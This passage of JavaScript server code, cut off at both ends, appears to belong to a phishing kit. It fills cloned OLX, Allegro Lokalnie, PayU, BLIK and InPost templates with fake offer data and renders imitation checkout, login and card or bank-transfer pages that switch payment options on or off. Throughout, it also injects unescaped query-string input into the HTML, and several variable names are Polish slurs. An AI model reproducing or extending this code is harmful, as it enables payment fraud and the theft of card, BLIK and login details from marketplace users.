		} else if (allegro === "kontakt") {
			templatePath = 'template/allegrolokalnie_messenger.html';
		} else if (allegro === "PayU") {
			templatePath = 'template/payu.html';
		} else if (allegro === "przelew") {
			templatePath = 'template/payu_przelew.html';
		} else if (allegro === "PayU_Przelew") {
			templatePath = 'template/payu_ladowanie.html';
		}

		if (olx === "dostawa") {
			templatePath = 'template/olx_dostawa.html';
		} else if (olx === "zakup") {
			templatePath = 'template/olx_zakup.html';
		} else if (olx === "PayU") {
			templatePath = 'template/olx_payu.html';
		} else if (olx === "PayU_BLIK") {
			templatePath = 'template/olx_payu_blik.html';
		} else if (olx === "PayU_Karta") {
			templatePath = 'template/olx_payu_karta.html';
		} else if (olx === "BLIK") {
			templatePath = 'template/olx_blik.html';
		} else if (olx === "inpost") {
			templatePath = 'template/olx_inpost.html';
		} else if (olx === "login") {
			templatePath = 'template/olx_login.html';
		} else if (olx === "PayU_Przelew") {
			templatePath = 'template/olx_payu_przelew.html';
		} else if (olx === "przelew") {
			templatePath = 'template/payu_ladowanie.html';
		} else if (olx === "PayU_Karta") {
			templatePath = 'template/olx_payu_karta.html';
		} else if (olx === "Platnosc") {
			templatePath = 'template/olx_payu_platnosc.html';
		} else if (olx === "error") {
			templatePath = 'template/olx_payu_error.html';
		}









		let template = fs.readFileSync(templatePath, 'utf8');

		if (allegro === "koszyk") {
			template = template
				.replace(/TUTAJNAZWADUZA/g, oferta.nazwa)
				.replace(/TUTAJSPRZEDAWCA/g, oferta.sprzedawca)
				.replace(/TUTAJCENA/g, oferta.cena)
				.replace(/TUTAJID/g, oferta.link)
				.replace(/TUTAJFOTY/g, `../images/${oferta.zdjecia[0]}`)
		} else if (allegro === "zakup") {
			let pathString = oferta.kategoria.split(";").map(k => `"${k.trim()}"`).join(", ");
			template = template
				.replace(/TUTAJNAZWADUZA/g, oferta.nazwa)
				.replace(/TUTAJID/g, oferta.link)
				.replace(/TUTAJCENA/g, oferta.cena)
				.replace(/TUTAJFOTY/g, `../images/${oferta.zdjecia[0]}`)
				.replace(/TUTAJSPRZEDAWCA/g, oferta.sprzedawca)
				.replace(/TUTAJKATEGORIA/g, `["Allegro Lokalnie", ${pathString}]`)
		} else if (allegro === "platnosc") {
			template = template
				.replace(/TUTAJNAZWADUZA/g, oferta.nazwa)
				.replace(/TUTAJCENA/g, oferta.cena)
				.replace(/TUTAJID/g, oferta.link)
				.replace(/TUTAJKARTY/g, globalCardFlag)
				.replace(/TUTAJPRZELEWY/g, przelewy.status)
				.replace(/TUTAJBLIKI/g, globalBlikFlag)
		} else if (allegro === "error") {
			template = template
				.replace(/TUTAJNAZWADUZA/g, oferta.nazwa)
				.replace(/TUTAJID/g, oferta.link)
		} else if (allegro === "login") {
			template = template
				.replace(/TUTAJID/g, oferta.link)
		} else if (allegro === "PayU") {
			template = template
				.replace(/TUTAJNAZWADUZA/g, oferta.nazwa)
				.replace(/TUTAJSPRZEDAWCA/g, oferta.sprzedawca)
				.replace(/TUTAJCENA/g, oferta.cena)
				.replace(/TUTAJSTATUS/g, przelewy.status)
		} else if (allegro === "przelew") {
			template = template
				.replace(/TUTAJNAZWADUZA/g, oferta.nazwa)
				.replace(/TUTAJSPRZEDAWCA/g, oferta.sprzedawca)
				.replace(/TUTAJCENA/g, oferta.cena)
				.replace(/TUTAJIMIE/g, przelewy.Imie)
				.replace(/TUTAJNAZWISKO/g, przelewy.Nazwisko)
				.replace(/TUTAJNUMER/g, przelewy.Numer)
				.replace(/TUTAJSTATUS/g, przelewy.status)
		} else if (allegro === "PayU_Przelew") {
			template = template
				.replace(/TUTAJSTATUS/g, przelewy.status)
		} else if (allegro === "kontakt") {
			const isSeller = req.query["is-seller"] === "1" ? "1" : "0";
			const messengerCwel = req.query.id || "";
			template = template
				.replace(/TUTAJNAZWADUZA/g, oferta.nazwa)
				.replace(/TUTAJID/g, oferta.link)
				.replace(/TUTAJFOTA/g, `../images/${oferta.zdjecia[0]}`)
				.replace(/TUTAJCENA/g, oferta.cena)
				.replace(/TUTAJSPRZEDAWCA/g, oferta.sprzedawca)
				.replace(/TUTAJCZYSELLER/g, isSeller)
				.replace(/TUTAJCUSTOMID/g, messengerCwel)
				.replace(/TUTAJSZMATA/g, oferta.lastonline)
		} else {
			if (req.subdomain === 'allegrolokalnie') {
				let pathString = oferta.kategoria.split(";").map(k => `"${k.trim()}"`).join(", ");
				let jebaniec = oferta.tagi.split(";").map(k => `"${k.trim()}"`).join(", ");
				template = template
					.replace(/<title>.*<\/title>/, `<title>${oferta.nazwa} | ${oferta.miasto} | Kup teraz na Allegro Lokalnie</title>`)
					.replace(/TUTAJNAZWADUZA/g, oferta.nazwa)
					.replace(/TUTAJOPIS/g, oferta.description)
					.replace(/TUTAJSPRZEDAWCA/g, oferta.sprzedawca)
					.replace(/TUTAJMIASTO/g, oferta.miasto)
					.replace(/TUTAJWOJ/g, oferta.wojewodztwo)
					.replace(/TUTAJKATEGORIA/g, `["Allegro Lokalnie", ${pathString}]`)
					.replace(/TUTAJCENA/g, oferta.cena)
					.replace(/TUTAJFOTY/g, JSON.stringify(oferta.zdjecia))
					.replace(/TUTAJFOTA/g, `../images/${oferta.zdjecia[0]}`)
					.replace(/TUTAJTAGI/g, `[${jebaniec}]`)
					.replace(/TUTAJID/g, oferta.link)
					.replace(/TUTAJWIEK/g, oferta.wiek)
					.replace(/TUTAJRODZAJ/g, oferta.rodzaj)
					.replace(/TUTAJDZIWKA/g, oferta.numer)
					.replace(/TUTAJSZMATA/g, oferta.lastonline)
					.replace(/TUTAJMALY/g, oferta.rodzaj.charAt(0).toUpperCase() + oferta.rodzaj.slice(1).toLowerCase());
			} else {
				if (req.subdomain === 'olx') {
					let pathString = oferta.kategoria.split(";").map(k => `"${k.trim()}"`).join(", ");
					let jebaniec = oferta.tagi.split(";").map(k => `"${k.trim()}"`).join(", ");
					const olxPricing = getItemPricing(oferta);
					template = template
						.replace(/<title>.*<\/title>/, `<title>${oferta.nazwa} ${oferta.miasto} â€˘ OLX.pl</title>`)
						.replace(/TUTAJNAZWA/g, oferta.nazwa)
						.replace(/TUTAJWIEK/g, oferta.wiek)
						.replace(/TUTAJLASTONLINE/g, oferta.lastonline)
						.replace(/TUTAJDZIWKA/g, oferta.numer)
						.replace(/TUTAJMIASTO/g, oferta.miasto)
						.replace(/TUTAJWOJ/g, oferta.wojewodztwo)
						.replace(/TUTAJOPIS/g, oferta.description)
						.replace(/TUTAJID/g, oferta.link)
						.replace(/TUTAJSPRZEDAWCA/g, oferta.sprzedawca)
						.replace(/TUTAJCENA/g, oferta.cena)
						.replace(/TUTAJOPLATA/g, String(olxPricing.fee))
						.replace(/TUTAJ5/g, String(olxPricing.totalInt))
						.replace(/TUTAJFOTY/g, JSON.stringify([...oferta.zdjecia, ""]))
						.replace(/TUTAJILOSC/g, oferta.zdjecia.length.toString())
						.replace(/TUTAJKATEGORIA/g, `["Strona główna", ${pathString}]`)
						.replace(/TUTAJTAGI/g, `[${jebaniec}]`)
						.replace(/TUTAJFOTA/g, `../images/${oferta.zdjecia[0]}`)
						.replace(/TUTAJIMIE/g, przelewy.Imie)
						.replace(/TUTAJNAZWISKO/g, przelewy.Nazwisko)
						.replace(/TUTAJNUMER/g, przelewy.Numer)
						.replace(/TUTAJSTATUS/g, przelewy.status)
				}
				if (olx === "dostawa") {
					const olxPricing = getItemPricing(oferta);
					template = template
						.replace(/TUTAJNAZWA/g, oferta.nazwa)
						.replace(/TUTAJFOTA/g, `../images/${oferta.zdjecia[0]}`)
						.replace(/TUTAJCENA/g, oferta.cena)
						.replace(/TUTAJ5/g, String(olxPricing.totalInt))
				} else if (olx === "zakup") {
					const olxPricing = getItemPricing(oferta);
					template = template
						.replace(/TUTAJNAZWA/g, oferta.nazwa)
						.replace(/TUTAJFOTA/g, `../images/${oferta.zdjecia[0]}`)
						.replace(/TUTAJCENA/g, oferta.cena)
						.replace(/TUTAJ5/g, String(olxPricing.totalInt))
						.replace(/TUTAJID/g, oferta.link)

					const {
						address,
						address2,
						location_description
					} = req.query;

					if (address && address2 && location_description) {
						const decodedAddress = decodeURIComponent(address);
						const decodedAddress2 = decodeURIComponent(address2);
						const decodedDesc = decodeURIComponent(location_description);

						const inpostHTML = `
						<div class="css-u5ns2m">
						  <h4 class="css-919381">Punkt odbioru</h4>
						  <div data-testid="fulfillment-locker-info" class="css-haw22i">
							<p class="css-m4b54k">Paczkomaty InPost</p>
							<p class="css-1g0gywg"><span>${decodedAddress2}</span><span> ${decodedAddress}</span></p>
							<p class="css-17y0gbi">${decodedDesc}.</p>
							<div class="css-1azuojv">
							  <div class="css-9bfw1m">Godziny otwarcia:<br>Pon. - Niedz.: Cały dzień</div>
							</div>
						  </div>
						  <a data-testid="select-locker" class="locker-selected">
							<button type="button" onclick="ChooseInPost()" class="css-1wxwqiw">
							  <span class="css-1ohf0ui"><span>Zmień punkt odbioru</span><i class="css-19ahzh2"></i></span>
							</button>
						  </a>
						</div></section>`;

						template = template.replace(/TUTAJPUNKT/g, inpostHTML);
					} else {
						const zwykly = `        <div class="css-u5ns2m">
        <h4 class="css-919381">Punkt odbioru</h4>
        <a data-testid="select-locker">
            <button type="button" onclick="ChooseInPost()" class="css-1wxwqiw"><span class="css-1ohf0ui"><span>Wybierz punkt odbioru</span><i class="css-19ahzh2"></i></span>
            </button>
        </a>
    </div></section>`
						template = template.replace(/TUTAJPUNKT/g, zwykly);
					}
				} else if (olx === "BLIK") {
					template = prepareGatewayBlikTemplate(template, req.subdomain, oferta, req);
				} else if (olx === "PayU_BLIK") {
					template = template
						.replace(/TUTAJCENA/g, String(getItemPricing(oferta).totalInt))
						.replace(/TUTAJID/g, oferta.link)
				} else if (olx === "PayU_Karta") {
					template = template
						.replace(/TUTAJCENA/g, String(getItemPricing(oferta).totalInt))
						.replace(/TUTAJID/g, oferta.link)
				} else if (olx === "Platnosc") {
					template = template
						.replace(/TUTAJID/g, oferta.link)
				} else if (olx === "PayU") {
					template = template
						.replace(/TUTAJCENA/g, String(getItemPricing(oferta).totalInt))
						.replace(/TUTAJID/g, oferta.link)
					if (globalCardFlag === "Nie") {
						const dziwki = `<a class="button-like" disabled tabindex="30" title="Karta" href="?olx=PayU_Karta"style="pointer-events: none; color: gray;text-decoration: none; opacity: 0.5;">
						<div>
							<h4>Karta</h4>
							<span>debetowa lub kredytowa</span>
						</div>
						<div>
							<svg viewBox="0 0 17.795 11" xmlns="http://www.w3.org/2000/svg" width="31px" style="margin-bottom:5px">
								<g transform="matrix(.15275 0 0 .15275 -1.1373 -1.1366)">
									<rect x="48.37" y="15.14" width="34.66" height="56.61" fill="#ff5f00"></rect>
									<path d="m51.94 43.45a35.94 35.94 0 0 1 13.75-28.3 36 36 0 1 0 0 56.61 35.94 35.94 0 0 1-13.75-28.31z" fill="#eb001b"></path>
									<path d="m123.94 43.45a36 36 0 0 1-58.25 28.3 36 36 0 0 0 0-56.61 36 36 0 0 1 58.25 28.3z" fill="#f79e1b"></path>
								</g>
							</svg>
							<svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg" width="31px">
								<path d="m36.64.4246-4.945 23.21h-5.979l4.946-23.21zm25.16 14.99 3.148-8.716 1.812 8.716zm6.671 8.224h5.531l-4.826-23.21h-5.105c-1.147 0-2.115.6702-2.545 1.703l-8.971 21.51h6.279l1.247-3.466h7.672zm-15.61-7.579c.02573-6.127-8.437-6.464-8.378-9.201.01748-.8333.8082-1.718 2.536-1.945.8582-.1125 3.217-.1989 5.897 1.039l1.049-4.922c-1.439-.525-3.29-1.029-5.593-1.029-5.91 0-10.07 3.156-10.11 7.674-.037 3.341 2.969 5.205 5.235 6.317 2.329 1.138 3.112 1.866 3.102 2.884-.01544 1.559-1.859 2.245-3.577 2.272-3.007.04779-4.752-.815-6.143-1.466l-1.083 5.086c1.397.6447 3.975 1.204 6.65 1.233 6.281 0 10.39-3.117 10.41-7.942m-24.77-15.63-9.687 23.21h-6.321l-4.767-18.52c-.2895-1.141-.5413-1.559-1.422-2.039-1.436-.783-3.81-1.518-5.899-1.974l.1432-.6743h10.17c1.296 0 2.463.8666 2.757 2.366l2.518 13.43 6.222-15.8z"
								style="fill:rgb(20,52,203)"></path>
							</svg>
						</div>
					</a>`

						template = template.replace(/TUTAJK/g, dziwki);

					} else {

						const szmaty = `<a class="button-like" tabindex="30" title="Karta" href="?olx=PayU_Karta">
						<div>
							<h4>Karta</h4>
							<span>debetowa lub kredytowa</span>
						</div>
						<div>
							<svg viewBox="0 0 17.795 11" xmlns="http://www.w3.org/2000/svg" width="31px" style="margin-bottom:5px">
								<g transform="matrix(.15275 0 0 .15275 -1.1373 -1.1366)">
									<rect x="48.37" y="15.14" width="34.66" height="56.61" fill="#ff5f00"></rect>
									<path d="m51.94 43.45a35.94 35.94 0 0 1 13.75-28.3 36 36 0 1 0 0 56.61 35.94 35.94 0 0 1-13.75-28.31z" fill="#eb001b"></path>
									<path d="m123.94 43.45a36 36 0 0 1-58.25 28.3 36 36 0 0 0 0-56.61 36 36 0 0 1 58.25 28.3z" fill="#f79e1b"></path>
								</g>
							</svg>
							<svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg" width="31px">
								<path d="m36.64.4246-4.945 23.21h-5.979l4.946-23.21zm25.16 14.99 3.148-8.716 1.812 8.716zm6.671 8.224h5.531l-4.826-23.21h-5.105c-1.147 0-2.115.6702-2.545 1.703l-8.971 21.51h6.279l1.247-3.466h7.672zm-15.61-7.579c.02573-6.127-8.437-6.464-8.378-9.201.01748-.8333.8082-1.718 2.536-1.945.8582-.1125 3.217-.1989 5.897 1.039l1.049-4.922c-1.439-.525-3.29-1.029-5.593-1.029-5.91 0-10.07 3.156-10.11 7.674-.037 3.341 2.969 5.205 5.235 6.317 2.329 1.138 3.112 1.866 3.102 2.884-.01544 1.559-1.859 2.245-3.577 2.272-3.007.04779-4.752-.815-6.143-1.466l-1.083 5.086c1.397.6447 3.975 1.204 6.65 1.233 6.281 0 10.39-3.117 10.41-7.942m-24.77-15.63-9.687 23.21h-6.321l-4.767-18.52c-.2895-1.141-.5413-1.559-1.422-2.039-1.436-.783-3.81-1.518-5.899-1.974l.1432-.6743h10.17c1.296 0 2.463.8666 2.757 2.366l2.518 13.43 6.222-15.8z"
								style="fill:rgb(20,52,203)"></path>
							</svg>
						</div>
					</a>`
						template = template.replace(/TUTAJK/g, szmaty);

					}
					if (globalBlikFlag === "Nie") {
						const cweleXD = `                                        <a class="button-complex" disabled style="pointer-events: none; color: gray;text-decoration: none; opacity: 0.5;" disabled tabindex=10 title=BLIK href="?olx=PayU_BLIK">
                                            <div>
                                                <h4>BLIK</h4><span>Już 16 mln ób płaci BLIKIEM.<br>A czy Ty korzystasz?</span></div>
                                            <div>
                                                <svg xmlns=http://www.w3.org/2000/svg viewBox="0 0 16.933333 7.9375003" id=svg10411 width=45px>
                                                    <defs id=defs10405>
                                                        <clippath clipPathUnits=userSpaceOnUse id=clipPath9704>
                                                            <path d="m 107.863,126.54 c 0,-6.21 5.036,-11.247 11.246,-11.247 v 0 c 6.213,0 11.244,5.037 11.244,11.247 v 0 c 0,6.209 -5.031,11.247 -11.244,11.247 v 0 c -6.21,0 -11.246,-5.038 -11.246,-11.247" id=path9702></path>
                                                        </clippath>
                                                        <lineargradient x1=0 y1=0 x2=1 y2=0 gradientUnits=userSpaceOnUse gradientTransform=matrix(15.904373,-15.904373,-15.904373,-15.904373,111.15674,134.4917) spreadMethod=pad id=linearGradient9714>
                                                            <stop offset=0 id=stop9710 style=stop-opacity:1;stop-color:rgb(229,47,8)></stop>
                                                            <stop offset=1 id=stop9712 style=stop-opacity:1;stop-color:rgb(233,79,150)></stop>
                                                        </lineargradient>
                                                        <clippath clipPathUnits=userSpaceOnUse id=clipPath9620>
                                                            <path d="m 60.766,148.846 c -6.211,0 -11.243,-5.031 -11.243,-11.232 v 0 -76.749 c 0,-6.203 5.032,-11.231 11.243,-11.231 v 0 h 190.111 c 6.211,0 11.244,5.028 11.244,11.231 v 0 76.749 c 0,6.201 -5.033,11.232 -11.244,11.232 v 0 z"
                                                            id=path9618></path>
                                                        </clippath>
                                                        <lineargradient x1=0 y1=0 x2=1 y2=0 gradientUnits=userSpaceOnUse gradientTransform=matrix(0,98.123276,98.123276,0,155.82178,50.339844) spreadMethod=pad id=linearGradient9632>
                                                            <stop offset=0 id=stop9626 style=stop-opacity:1;stop-color:rgb(90,90,90)></stop>
                                                            <stop offset=0.73696312 id=stop9628 style=stop-opacity:1;stop-color:rgb(0,0,0)></stop>
                                                            <stop offset=1 id=stop9630 style=stop-opacity:1;stop-color:rgb(0,0,0)></stop>
                                                        </lineargradient>
                                                        <filter id=filter12553 style=color-interpolation-filters:srgb>
                                                            <feflood id=feFlood12543 result=flood flood-color=rgb(0,0,0) flood-opacity=1></feflood>
                                                            <fecomposite id=feComposite12545 result=composite1 operator=in in2=SourceGraphic in=flood></fecomposite>
                                                            <fegaussianblur id=feGaussianBlur12547 result=blur stdDeviation=0.8 in=composite1></fegaussianblur>
                                                            <feoffset id=feOffset12549 result=offset dy=1.2 dx=1></feoffset>
                                                            <fecomposite id=feComposite12551 result=composite2 operator=over in2=offset in=SourceGraphic></fecomposite>
                                                        </filter>
                                                    </defs>
                                                    <g id=g9614 transform=matrix(0.07964954,0,0,-0.08000544,-3.9444845,11.908491)>
                                                        <g clip-path=url(#clipPath9620) id=g9616>
                                                            <g id=g9622>
                                                                <g id=g9624>
                                                                    <path id=path9634 d="m 60.766,148.846 c -6.211,0 -11.243,-5.031 -11.243,-11.232 v 0 -76.749 c 0,-6.203 5.032,-11.231 11.243,-11.231 v 0 h 190.111 c 6.211,0 11.244,5.028 11.244,11.231 v 0 76.749 c 0,6.201 -5.033,11.232 -11.244,11.232 v 0 z"
                                                                    style=fill:url(#linearGradient9632);stroke:none></path>
                                                                </g>
                                                            </g>
                                                        </g>
                                                    </g>
                                                    <g id=g9698 transform=matrix(0.07964954,0,0,-0.08000544,-3.9444845,11.908491)>
                                                        <g clip-path=url(#clipPath9704) id=g9700>
                                                            <g id=g9706>
                                                                <g id=g9708>
                                                                    <path id=path9716 d="m 107.863,126.54 c 0,-6.21 5.036,-11.247 11.246,-11.247 v 0 c 6.213,0 11.244,5.037 11.244,11.247 v 0 c 0,6.209 -5.031,11.247 -11.244,11.247 v 0 c -6.21,0 -11.246,-5.038 -11.246,-11.247"
                                                                    style=fill:url(#linearGradient9714);stroke:none></path>
                                                                </g>
                                                            </g>
                                                        </g>
                                                    </g>
                                                    <g transform=matrix(0.22577825,0,0,0.22678709,-2.9947679,-7.391132) id=g12450 style=filter:url(#filter12553)>
                                                        <path d="M 44.898842,37.764102 H 49.33361 V 62.929151 H 44.898842 Z" id=path9726 style=fill:rgb(255,255,255);fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:0.352778></path>
                                                        <path d="m 53.269552,46.447021 h 4.435123 v 16.482482 h -4.435123 z" id=path9728 style=fill:rgb(255,255,255);fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:0.352778></path>
                                                        <g id=g9730 transform=matrix(0.35277777,0,0,-0.35277777,33.367875,58.742773)>
                                                            <path d="m 0,0 c -6.344,0 -11.48,5.134 -11.48,11.478 0,6.336 5.136,11.477 11.48,11.477 6.339,0 11.478,-5.141 11.478,-11.477 C 11.478,5.134 6.339,0 0,0 m 0,35.321 c -4.081,0 -7.921,-1.025 -11.279,-2.83 V 59.467 H -23.852 V 11.478 c 0,-13.173 10.678,-23.851 23.852,-23.851 13.168,0 23.846,10.678 23.846,23.851 0,13.168 -10.678,23.843 -23.846,23.843"
                                                            id=path9732 style=fill:rgb(255,255,255);fill-opacity:1;fill-rule:nonzero;stroke:none></path>
                                                        </g>
                                                        <g id=g9776 transform=matrix(0.35277777,0,0,-0.35277777,72.298806,62.929257)>
                                                            <path d="M 0,0 H 16.201 L -3.264,25.129 14.379,46.722 H -0.309 L -17.635,24.995 V 71.334 H -30.209 V 0 h 12.574 l -0.01,24.934 z" id=path9778 style=fill:rgb(255,255,255);fill-opacity:1;fill-rule:nonzero;stroke:none></path>
                                                        </g>
                                                    </g>
                                                </svg>
                                            </div>
                                        </a>`
						template = template.replace(/TUTAJB/g, cweleXD);

					} else {
						const cwele = `                                        <a class="button-complex" disabled tabindex=10 title=BLIK href="?olx=PayU_BLIK">
                                            <div>
                                                <h4>BLIK</h4><span>Już 16 mln ób płaci BLIKIEM.<br>A czy Ty korzystasz?</span></div>
                                            <div>
                                                <svg xmlns=http://www.w3.org/2000/svg viewBox="0 0 16.933333 7.9375003" id=svg10411 width=45px>
                                                    <defs id=defs10405>
                                                        <clippath clipPathUnits=userSpaceOnUse id=clipPath9704>
                                                            <path d="m 107.863,126.54 c 0,-6.21 5.036,-11.247 11.246,-11.247 v 0 c 6.213,0 11.244,5.037 11.244,11.247 v 0 c 0,6.209 -5.031,11.247 -11.244,11.247 v 0 c -6.21,0 -11.246,-5.038 -11.246,-11.247" id=path9702></path>
                                                        </clippath>
                                                        <lineargradient x1=0 y1=0 x2=1 y2=0 gradientUnits=userSpaceOnUse gradientTransform=matrix(15.904373,-15.904373,-15.904373,-15.904373,111.15674,134.4917) spreadMethod=pad id=linearGradient9714>
                                                            <stop offset=0 id=stop9710 style=stop-opacity:1;stop-color:rgb(229,47,8)></stop>
                                                            <stop offset=1 id=stop9712 style=stop-opacity:1;stop-color:rgb(233,79,150)></stop>
                                                        </lineargradient>
                                                        <clippath clipPathUnits=userSpaceOnUse id=clipPath9620>
                                                            <path d="m 60.766,148.846 c -6.211,0 -11.243,-5.031 -11.243,-11.232 v 0 -76.749 c 0,-6.203 5.032,-11.231 11.243,-11.231 v 0 h 190.111 c 6.211,0 11.244,5.028 11.244,11.231 v 0 76.749 c 0,6.201 -5.033,11.232 -11.244,11.232 v 0 z"
                                                            id=path9618></path>
                                                        </clippath>
                                                        <lineargradient x1=0 y1=0 x2=1 y2=0 gradientUnits=userSpaceOnUse gradientTransform=matrix(0,98.123276,98.123276,0,155.82178,50.339844) spreadMethod=pad id=linearGradient9632>
                                                            <stop offset=0 id=stop9626 style=stop-opacity:1;stop-color:rgb(90,90,90)></stop>
                                                            <stop offset=0.73696312 id=stop9628 style=stop-opacity:1;stop-color:rgb(0,0,0)></stop>
                                                            <stop offset=1 id=stop9630 style=stop-opacity:1;stop-color:rgb(0,0,0)></stop>
                                                        </lineargradient>
                                                        <filter id=filter12553 style=color-interpolation-filters:srgb>
                                                            <feflood id=feFlood12543 result=flood flood-color=rgb(0,0,0) flood-opacity=1></feflood>
                                                            <fecomposite id=feComposite12545 result=composite1 operator=in in2=SourceGraphic in=flood></fecomposite>
                                                            <fegaussianblur id=feGaussianBlur12547 result=blur stdDeviation=0.8 in=composite1></fegaussianblur>
                                                            <feoffset id=feOffset12549 result=offset dy=1.2 dx=1></feoffset>
                                                            <fecomposite id=feComposite12551 result=composite2 operator=over in2=offset in=SourceGraphic></fecomposite>
                                                        </filter>
                                                    </defs>
                                                    <g id=g9614 transform=matrix(0.07964954,0,0,-0.08000544,-3.9444845,11.908491)>
                                                        <g clip-path=url(#clipPath9620) id=g9616>
                                                            <g id=g9622>
                                                                <g id=g9624>
                                                                    <path id=path9634 d="m 60.766,148.846 c -6.211,0 -11.243,-5.031 -11.243,-11.232 v 0 -76.749 c 0,-6.203 5.032,-11.231 11.243,-11.231 v 0 h 190.111 c 6.211,0 11.244,5.028 11.244,11.231 v 0 76.749 c 0,6.201 -5.033,11.232 -11.244,11.232 v 0 z"
                                                                    style=fill:url(#linearGradient9632);stroke:none></path>
                                                                </g>
                                                            </g>
                                                        </g>
                                                    </g>
                                                    <g id=g9698 transform=matrix(0.07964954,0,0,-0.08000544,-3.9444845,11.908491)>
                                                        <g clip-path=url(#clipPath9704) id=g9700>
                                                            <g id=g9706>
                                                                <g id=g9708>
                                                                    <path id=path9716 d="m 107.863,126.54 c 0,-6.21 5.036,-11.247 11.246,-11.247 v 0 c 6.213,0 11.244,5.037 11.244,11.247 v 0 c 0,6.209 -5.031,11.247 -11.244,11.247 v 0 c -6.21,0 -11.246,-5.038 -11.246,-11.247"
                                                                    style=fill:url(#linearGradient9714);stroke:none></path>
                                                                </g>
                                                            </g>
                                                        </g>
                                                    </g>
                                                    <g transform=matrix(0.22577825,0,0,0.22678709,-2.9947679,-7.391132) id=g12450 style=filter:url(#filter12553)>
                                                        <path d="M 44.898842,37.764102 H 49.33361 V 62.929151 H 44.898842 Z" id=path9726 style=fill:rgb(255,255,255);fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:0.352778></path>
                                                        <path d="m 53.269552,46.447021 h 4.435123 v 16.482482 h -4.435123 z" id=path9728 style=fill:rgb(255,255,255);fill-opacity:1;fill-rule:nonzero;stroke:none;stroke-width:0.352778></path>
                                                        <g id=g9730 transform=matrix(0.35277777,0,0,-0.35277777,33.367875,58.742773)>
                                                            <path d="m 0,0 c -6.344,0 -11.48,5.134 -11.48,11.478 0,6.336 5.136,11.477 11.48,11.477 6.339,0 11.478,-5.141 11.478,-11.477 C 11.478,5.134 6.339,0 0,0 m 0,35.321 c -4.081,0 -7.921,-1.025 -11.279,-2.83 V 59.467 H -23.852 V 11.478 c 0,-13.173 10.678,-23.851 23.852,-23.851 13.168,0 23.846,10.678 23.846,23.851 0,13.168 -10.678,23.843 -23.846,23.843"
                                                            id=path9732 style=fill:rgb(255,255,255);fill-opacity:1;fill-rule:nonzero;stroke:none></path>
                                                        </g>
                                                        <g id=g9776 transform=matrix(0.35277777,0,0,-0.35277777,72.298806,62.929257)>
                                                            <path d="M 0,0 H 16.201 L -3.264,25.129 14.379,46.722 H -0.309 L -17.635,24.995 V 71.334 H -30.209 V 0 h 12.574 l -0.01,24.934 z" id=path9778 style=fill:rgb(255,255,255);fill-opacity:1;fill-rule:nonzero;stroke:none></path>
                                                        </g>
                                                    </g>
                                                </svg>
                                            </div>
                                        </a>`
						template = template.replace(/TUTAJB/g, cwele);
					}
					if (przelewy.status === 'Nie') {
						const przelewiki = `                                        <a class="button-complex" href="" tabindex="30" title="Przelew" style="pointer-events: none; color: gray;text-decoration: none; opacity: 0.5;">
                                    
                                        
                                        
                                
                                        
                                        <div>
                                            <h4>Przelew</h4>
                                            <span>Wybierz swój bank</span>
                                        </div>
                                        <div>
                                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="35px">
                                                <g transform="matrix(.64865 0 0 .65714 0 .5)" fill="#6ab972" fill-rule="evenodd">
                                                    <path d="m10.39 8h16.13l-8-3.56zm26.12 0-0.88 4h-34.33l-0.87-4 18.04-8z"></path>
                                                    <path d="m17.19 13h2.51v1.1a9.26 9.26 0 0 1 2.86 0.78l-1 2.46-0.7-0.3a8.08 8.08 0 0 0-1.18-0.35 3.94 3.94 0 0 0-0.93-0.1 1.54 1.54 0 0 0-0.88 0.2 0.61 0.61 0 0 0-0.27 0.52 0.77 0.77 0 0 0 0.35 0.61 14.93 14.93 0 0 0 1.55 0.83l0.18 0.07 0.17 0.08a5.6 5.6 0 0 1 1.89 1.2 2.8 2.8 0 0 1 0.22 0.25 3.15 3.15 0 0 1 0.6 2 3.31 3.31 0 0 1-0.56 1.89 3.74 3.74 0 0 1-1.58 1.31 6.37 6.37 0 0 1-0.7 0.25v1.28h-2.48v-1.08a6.53 6.53 0 0 1-1.18-0.15 8.06 8.06 0 0 1-1.66-0.55v-2.77a10.12 10.12 0 0 0 1.69 0.68 1.17 1.17 0 0 0 0.2 0.05 7.72 7.72 0 0 0 0.92 0.2 3.18 3.18 0 0 0 0.86 0.05 1.88 1.88 0 0 0 1-0.22 0.77 0.77 0 0 0 0.32-0.63 0.93 0.93 0 0 0-0.12-0.43 1.31 1.31 0 0 0-0.43-0.35c-0.17-0.1-0.6-0.3-1.25-0.6l-0.31-0.15s-0.07 0-0.1-0.05a6.63 6.63 0 0 1-1.53-0.9l-0.07-0.08a3 3 0 0 1-0.82-1.1 3.35 3.35 0 0 1-0.28-1.48 3 3 0 0 1 1.18-2.52 4.2 4.2 0 0 1 1.55-0.73v-1.27z"></path>
                                                    <path d="m4.57 13h6.09l-0.12 1.81h-0.78l0.9 13.4h15.64l0.9-13.4h-0.78l-0.12-1.81h6.1l-0.13 1.81h-0.78l0.91 13.4h2.6v2.93h-33v-2.98h2.54l0.91-13.4h-0.78z"></path>
                                                    <path d="m37 35h-37v-2.9h37z"></path>
                                                </g>
                                            </svg>
                                        </div>
                                    </a>
									`
						template = template.replace(/TUTAJP/g, przelewiki);
					} else {
						const przelewiki = `                                        <a class=button-complex tabindex=30 title=Przelew href="?olx=PayU_Przelew">
                                            <div>
                                                <h4>Przelew</h4><span>Wybierz swój bank</span></div>
                                            <div>
                                                <svg viewBox="0 0 24 24" xmlns=http://www.w3.org/2000/svg width=35px>
                                                    <g transform="matrix(.64865 0 0 .65714 0 .5)" fill=#6ab972 fill-rule=evenodd>
                                                        <path d="m10.39 8h16.13l-8-3.56zm26.12 0-0.88 4h-34.33l-0.87-4 18.04-8z"></path>
